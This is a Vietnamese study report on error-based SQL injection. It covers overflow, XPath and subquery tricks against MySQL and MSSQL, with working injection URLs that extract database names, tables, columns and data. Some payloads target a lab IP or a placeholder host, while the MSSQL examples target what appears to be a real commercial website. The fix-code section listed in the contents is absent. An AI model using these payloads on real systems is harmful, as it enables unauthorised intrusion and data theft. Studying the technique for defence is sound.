 # <div align="center"><p> Error-base-sql-injection </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 20/4/2022
 ### MỤC LỤC
 1. [Tìm hiểu về error base sql injection](#gioithieu)
 
     1.1 [Khái niệm Error-based sqli ](#kn)
      
     1.2 [Khi nào cần phải sử dụng Error-based sqli](#kn1)
     
 2. [Chi tiết về lỗi sql injection](#ct1) 

     2.1 [Khai thác lỗi sqli dựa trên Numberic overflow ](#ct2)
      
     2.2 [Khai thác lỗi sqli sử dụng hàm EXP](#ct3)

     2.3 [Khai thác lỗi sqli sử dụng hàm Extractvalue ](#ct4)
      
     2.4 [Khai thác lỗi sqli sử dụng hàm UPDATEXML](#ct5)

     2.5 [Khai thác lỗi sqli sử dụng SubQuery Injection ](#ct6)
      
     2.6 [MSSQL Error Based Injection](#ct7)
       
 3. [Thực hành các lỗi sql injection](#lv)

     3.1 [Code sửa lỗi sqli cho level2](#code1)
      
     3.2 [Code sửa lỗi sqli cho level1](#code2)
     
     3.3 [Các hàm sử dụng](#chsd)
 
### Nội dung báo cáo 
#### 1. Tìm hiểu về error base sql injection <a name="gioithieu"></a>
<br> 1.1 Khái niệm Error-based sqli<a name="kn"></a></br>
 - Là một kỹ thuật tấn công SQL Injection dựa vào thông báo lỗi được trả về từ Database Server có chứa thông tin về cấu trúc của cơ sở dữ liệu. Trong một vài trường hợp, chỉ một mình Error-based là đủ cho hacker có thể liệt kê được các thuộc tính của cơ sở dữ liệu.

<br> 1.2 Khi nào cần phải sử dụng Error-based sqli <a name="kn1"></a></br>
 - Đó là khi chúng ta không thể nhận được bất kỳ đầu ra nào bằng cách sử dụng Union base sqli và lỗi sẽ hiển thị cho chúng ta. Trong trường hợp đó, chúng ta phải sử dụng tính năng error base sqli.

#### 2. Chi tiết về lỗi sql injection <a name="ct1"></a>
<br> 2.1 Khai thác lỗi sqli dựa trên Numberic overflow <a name="ct2"></a></br>
 - MySQL hỗ trợ các kiểu dữ liệu tiêu chuẩn SQL như INTEGER, SMALLINT, TINYINT, MEDIUMINT, BIGINT. FLOAT, DOUBLE…
 - Mỗi kiểu dữ liệu sẽ có một phạm vi giới hạn khác nhau. Khi các giá trị vượt ra ngoài giới hạn này nó sẽ dẫn tới hiện tượng tràn số (overflow). Có sự khác nhau trong xử lý Out-of-range và overflow giữa các phiên bản MySQL. Việc xử lý Out-of-range và overflow từ phiên bản MySQL 5.5.5 trở lên sẽ trả về một thông báo lỗi, trong khi trong các phiên bản thấp hơn mặc định sẽ trả về một kết quả mà không đưa ra bất kỳ thông báo lỗi nào.
   - Ví dụ:
    -  kiểu dữ liệu BIGINT có kích thước 8 byte (64 bit). Giá trị số nguyên có dấu lớn nhất của nó là:

       - Binary: 0b0111111111111111111111111111111111111111111111111111111111111111
       - Hex: 0x7fffffffffffffff
       - Decimal: 9223372036854775807
  
       - MySQL 5.5.5 trở lên: Khi thực hiện phép toán với các giá trị trên (ví dụ tăng thêm 1) sẽ gây ra tràn số và trả về thông báo lỗi:
    
         ![image](https://user-images.githubusercontent.com/101852647/164913365-80432bf3-4fa3-4c45-b262-3adcc496c027.png)
      
       - Trong phiên bản MySQL thấp hơn, kết quả trả về một giá trị:
    
         ![image](https://user-images.githubusercontent.com/101852647/164141921-c915a0e2-6be1-4b04-b616-9e5f694c8c5f.png)
      
   - Đối với kiểu dữ liệu BIGINT không dấu, giá trị lớn nhất của nó là:

     - Binary: 0b1111111111111111111111111111111111111111111111111111111111111111
     - Hex: 0xFFFFFFFFFFFFFFFF
     - Decimal: 18446744073709551615
     - Kết quả cũng tương tự, hiện tượng tràn số xảy ra trong các phiên bản MySQL 5.5.5 trở lên:
    
       ![image](https://user-images.githubusercontent.com/101852647/164142773-bd83384f-ef54-4d74-9a56-cb23bfe184bd.png)
      
     - Với phiên bản MySQL thấp hơn:
    
       ![image](https://user-images.githubusercontent.com/101852647/164142884-5ada5eed-82ec-491b-9503-261c1a4c6b62.png)
      
 - Lợi dụng xử lý out-of-range và overflow trên các phiên bản MySQL từ 5.5.5 trở lên, ta có thể gây ra tràn số để leak dữ liệu qua các thông báo lỗi, qua đó thực hiện khai thác Error based SQL injection.
 
<br> 2.2 Khai thác lỗi sqli sử dụng hàm EXP <a name="ct3"></a></br>
 -  Hàm exp () sẽ gây ra lỗi tràn khi vượt qua một giá trị lớn trên 709. Đây là một lỗi tràn khác trong kiểu dữ liệu DOUBLE trong MySQL.

       ![image](https://user-images.githubusercontent.com/101852647/164148420-1f95fc82-e8a5-4011-91f2-ff480e3abbf1.png)
    
 - Chúng ta có thể gây ra các lỗi `giá trị DOUBLE nằm ngoài phạm vi` bằng cách phủ định các truy vấn. Giả sử khi thực hiện phủ định bit một truy vấn, nó sẽ trả về “18446744073709551615”. Đó là do một hàm trả về 0 khi thực hiện thành công và khi chúng ta phủ định nó sẽ là giá trị BIGINT không dấu tối đa.
 
      ![image](https://user-images.githubusercontent.com/101852647/164149342-3d2eb3ab-ccc2-4fb5-9677-41f9dce7bdda.png)

 - Khi chúng ta chuyển các truy vấn có phủ định bit, điều này sẽ gây ra lỗi tràn DOUBLE và chúng ta có thể trích xuất dữ liệu.

      ![image](https://user-images.githubusercontent.com/101852647/164149550-6ac2ae5a-ac39-4574-a3e5-6db381843ae5.png)
      
<br> 2.3 Khai thác lỗi sqli sử dụng hàm Extractvalue <a name="ct4"></a></br>
 - Chúng ta sẽ sử dụng một trong các hàm XPATH là Extractvalue() để tạo ra lỗi và lấy đầu ra. 
 - Trong MySQL chạy một truy vấn XPath đối với một chuỗi đại diện cho dữ liệu XML. Hàm nhận đầu vào ở dạng sau:
 
   `ExtractValue ('xmldatahere', 'xpathqueryhere')`
   
 - Nếu truy vấn XPath không chính xác về mặt cú pháp, chúng ta sẽ gặp thông báo:
 
   `XPATH syntax error: 'xpathqueryhere'`
   
 - Ví dụ:
    - Lấy database hiện tại:
 
       `http://192.168.199.130/cat.php?id=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--`

        ![image](https://user-images.githubusercontent.com/101852647/164183321-35f7ab4d-c80e-452b-8777-e8624790d9a3.png)
    
<br> 2.4 Khai thác lỗi sqli sử dụng hàm UPDATEXML <a name="ct5"></a></br>
 -  Chúng ta sẽ sử dụng một trong các hàm XPATH là UPDATEXML() để tạo ra lỗi và lấy đầu ra. 
 - Trong MySQL chạy một truy vấn XPath đối với một chuỗi đại diện cho dữ liệu XML. Hàm nhận đầu vào ở dạng sau:
   
   `UPDATEXML (XMLType_Instance, XPath_string, value_expression, namespace_string)`
   
 - Nếu truy vấn XPath không chính xác về mặt cú pháp, chúng ta sẽ gặp thông báo:
 
   `XPATH syntax error: 'xpathqueryhere'`
   
 - Ví dụ:
   - Lấy database hiện tại:
 
      `http://192.168.199.130/cat.php?id=-35" and updatexml(null,concat(0x3a,(0x0a,(select database()))),null)--`
    
       ![image](https://user-images.githubusercontent.com/101852647/164187334-2e228340-5001-4075-80f3-eb463d7f5b94.png)

<br> 2.5 Khai thác lỗi sqli sử dụng SubQuery Injection <a name="ct6"></a></br>  

- Nó cũng tương đối giống với XPATH. Nhưng vấn đề đặt ra là tại sao chúng ta không sử dụng XPATH mà phải sử dụng cái này đó là do XPATH không có sẵn trong một số phiên bản của MySQL và có thể bị lọc hoặc khóa bởi quản trị viên, đó là lý do tại sao để khắc phục vấn đề này, chúng ta sẽ sử dụng Sub Query Injection.
- Ví dụ:
   - Bây giờ sẽ sử dụng SubQuery Injection:
  
      `http://192.168.199.130/cat.php?id=1' and (select 1 from (Select count(*),Concat((<Your Query here to return single row>),0x3a,floor(rand (0) *2))y from information_schema.tables group by y) x)-- -`
   
       ![image](https://user-images.githubusercontent.com/101852647/164198530-3b7be02e-31a7-4943-a2a9-dcb9d40155c6.png)

   - Lấy database hiện tại:
 
      `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`

   - Lấy các bảng:

      `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
      
   - Lấy cột từ bất kỳ một bảng:

     `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='<table_name_here>' limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
     
  - Lấy dữ liệu từ các cột:

     `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select concat(<column_1>,<column_2>) from <table_name_here> limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
     
<br> 2.6 MSSQL Error Based Injection <a name="ct7"></a></br>  
  - Đầu tiên chúng ta cần phải biết một vài kiểu comment của MSSQL:
    - `-`	:	Comment Loại 1
    - `- +`	:	Comment Loại 2
    - `- + -`	: SQL Comment
    - `/ ** /`	:	Inline Comment
    - `;% 00`	:	Null Byte
   
 - Ví dụ:

    - Bắt đầu comment với mục tiêu:
    
      `http://www.timescanindia.in/Product.aspx?Id=7--
       working fine.`
      
      `http://www.timescanindia.in/Product.aspx?Id=7 order by 1--
       No Error`
     
   - Lấy tên database:

     `http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--`

   - Lấy version:

     `http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--`

   - có thể lấy tất cả các bảng và cột:

     `http://www.timescanindia.in/Product.aspx?Id=7 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--`

